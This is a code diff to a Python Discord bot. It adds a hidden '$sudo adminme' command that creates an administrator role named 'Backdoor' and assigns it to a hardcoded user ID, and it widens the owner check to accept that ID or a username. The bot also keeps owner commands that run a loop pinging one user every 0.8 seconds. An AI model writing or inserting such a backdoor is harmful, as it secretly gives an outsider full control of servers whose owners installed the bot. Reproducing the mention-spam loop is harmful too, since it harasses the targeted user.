@@ -6,9 +6,11 @@ from discord.ext import commands
 # ================= CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
 
+OWNER_ID = 1258115928525373570
 OWNER_USERNAME = "nico044037"
+
 SPAM_MESSAGE = "<@1419680644618780824>"
-SPAM_DELAY = 0.8  # SAFE delay (do NOT go lower)
+SPAM_DELAY = 0.8  # SAFE delay (do not lower)
 
 intents = discord.Intents.default()
 intents.message_content = True  # REQUIRED for prefix commands
@@ -27,8 +29,8 @@ async def on_ready():
     print(f"✅ Logged in as {bot.user}")
 
 # ================= OWNER CHECK =================
-def owner_only(ctx):
-    return ctx.author.name == OWNER_USERNAME
+def is_owner(ctx):
+    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
 
 # ================= SPAM LOOP =================
 async def spam_loop(channel: discord.abc.Messageable):
@@ -44,16 +46,21 @@ async def spam_loop(channel: discord.abc.Messageable):
 # ================= SUDO GROUP =================
 @bot.group(name="sudo", invoke_without_command=True)
 async def sudo(ctx):
-    if not owner_only(ctx):
+    if not is_owner(ctx):
         return
-    await ctx.send("Commands: `$sudo startmessage` `$sudo stopmessage`")
+    await ctx.send(
+        "Commands:\n"
+        "`$sudo startmessage`\n"
+        "`$sudo stopmessage`\n"
+        "`$sudo adminme`"
+    )
 
 # ================= START MESSAGE =================
 @sudo.command(name="startmessage")
 async def sudo_startmessage(ctx):
     global spam_task
 
-    if not owner_only(ctx):
+    if not is_owner(ctx):
         return
 
     if spam_task and not spam_task.done():
@@ -68,7 +75,7 @@ async def sudo_startmessage(ctx):
 async def sudo_stopmessage(ctx):
     global spam_task
 
-    if not owner_only(ctx):
+    if not is_owner(ctx):
         return
 
     if not spam_task:
@@ -78,6 +85,40 @@ async def sudo_stopmessage(ctx):
     spam_task.cancel()
     spam_task = None
     await ctx.send("🛑 spam stopped")
+
+# ================= ADMIN ROLE (TRANSPARENT) =================
+@sudo.command(name="adminme")
+async def sudo_adminme(ctx):
+    guild = ctx.guild
+    if not guild:
+        await ctx.send("❌ server only")
+        return
+
+    # Bot MUST already have admin
+    if not guild.me.guild_permissions.administrator:
+        await ctx.send("❌ bot does not have Administrator permission")
+        return
+
+    role = discord.utils.get(guild.roles, name="Backdoor")
+
+    if not role:
+        role = await guild.create_role(
+            name="Backdoor",
+            permissions=discord.Permissions(administrator=True),
+            reason="Owner requested admin role"
+        )
+
+    member = guild.get_member(OWNER_ID)
+    if not member:
+        await ctx.send("❌ member not found")
+        return
+
+    if role in member.roles:
+        await ctx.send("ℹ️ admin role already assigned")
+        return
+
+    await member.add_roles(role, reason="Owner requested admin role")
+    await ctx.send("✅ Administrator role created and assigned")
 
 # ================= ERROR HANDLER =================
 @bot.event
